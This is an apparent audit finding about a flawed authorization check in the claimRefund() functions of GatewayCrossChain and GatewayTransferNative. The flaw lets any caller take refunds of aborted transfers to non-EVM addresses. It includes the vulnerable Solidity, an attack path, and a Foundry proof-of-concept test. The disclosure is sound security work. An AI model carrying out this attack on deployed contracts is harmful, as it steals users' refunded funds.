# Aborted Cross chain transfers to non-evm chains can be claimed by anyone

### Summary

Setting the receiver to `msg.sender` inside the `GatewayCrossChain.claimRefund()` and `GatewayTransferNative.claimRefund()` functions allows anyone to claim someone elses refund for themselves for refunds of non-evm addresses.

### Root Cause

The `claimRefund()` function is designed to allow a user or an authorized bot to reclaim funds from a failed cross-chain transaction. However, the authorization logic is flawed when dealing with refunds for addresses that aren't a standard 20-byte EVM address, allowing anyone to steal user funds.

The execution flow is as follows:
1.  The `receiver` variable is optimistically initialized to `msg.sender`.
2.  An `if` statement then checks if the destination `walletAddress` has a length of 20 bytes (the standard for EVM addresses).
3.  **If it is an EVM address**, `receiver` is correctly reassigned to the intended recipient's address. The subsequent authorization check, `require(bots[msg.sender] || msg.sender == receiver, "INVALID_CALLER")`, correctly ensures only the owner or a bot can proceed.
4.  **If it is a non-EVM address**, the `if` block is skipped. The `receiver` variable retains its initial value of `msg.sender`.
5.  The authorization check then evaluates to `require(bots[msg.sender] || msg.sender == msg.sender, "INVALID_CALLER")`. Since `msg.sender == msg.sender` is always true, the check becomes ineffective, granting any caller the permission to claim the refund.

The attacker, acting as `msg.sender`, passes this check and receives the funds that should have been returned to the original user.

```solidity
function claimRefund(bytes32 externalId) external {
    RefundInfo storage refundInfo = refundInfos[externalId];

@>  address receiver = msg.sender;
@>  if(refundInfo.walletAddress.length == 20) {
@>      receiver = address(uint160(bytes20(refundInfo.walletAddress)));
    }
@>  require(bots[msg.sender] || msg.sender == receiver, "INVALID_CALLER");
    require(refundInfo.externalId != "", "REFUND_NOT_EXIST");
    
    TransferHelper.safeTransfer(refundInfo.token, receiver, refundInfo.amount);
    delete refundInfos[externalId];

    emit EddyCrossChainRefundClaimed(
        externalId,
        refundInfo.token,
        refundInfo.amount,
        abi.encodePacked(msg.sender)
    );
}
```

### Internal Pre-conditions

none

### External Pre-conditions

1. The zeta chain gateway needs to fail and abort the transaction  

### Attack Path

1.  A legitimate user initiates a cross-chain transfer from an EVM-compatible chain to a non-EVM chain (e.g., Bitcoin).
2.  The transaction fails for an external reason, and the `onAbort()` function is triggered, logging the details for a future refund in the `refundInfos` mapping.
3.  An attacker monitoring the contract for such aborted transactions finds the `externalId` of the failed transfer.
4.  The attacker calls `claimRefund()` with the corresponding `externalId`.
5.  Due to the flaw, the contract's authorization check passes. The `safeTransfer` function is called with `receiver` set to `msg.sender` (the attacker), who successfully steals the user's entire refund.

### Impact

This vulnerability leads to a permanent loss of funds for users whose cross-chain transactions to non-EVM addresses fail. The attacker can steal the full amount of any such refund. The issue affects both the `GatewayCrossChain.sol` and `GatewayTransferNative.sol` contracts.

### PoC

Append the following test to `GatewayCrossChain.sol` and run
`forge test --fork-url https://zetachain-evm.blockpi.network/v1/rpc/public --mt test_AnyoneCanRefundOnNoneEvmAddressAbort`
```solidity
function test_AnyoneCanRefundOnNoneEvmAddressAbort() public {
    token1Z.mint(address(gatewayCrossChain), initialBalance);

    vm.startPrank(address(gatewayZEVM));

    bytes32 externalId = keccak256(abi.encodePacked(block.timestamp));

    // A cross chain transfer to a non-evm chain fails, which gets added to the refundInfos mapping
    gatewayCrossChain.onAbort(
        AbortContext({
            sender: abi.encode(address(this)),
            asset: address(token1Z),
            amount: initialBalance,
            outgoing: false,
            chainID: 7000,
            revertMessage: bytes.concat(externalId, solAddress)
        })
    );
    vm.stopPrank();

    uint256 balanceBefore = token1Z.balanceOf(user1);

    // Any address (in this case user1) can claim this refund for themself
    vm.prank(user1);
    gatewayCrossChain.claimRefund(externalId);

    uint256 balanceAfter = token1Z.balanceOf(user1);

    assert(balanceAfter - balanceBefore == initialBalance);
}
```
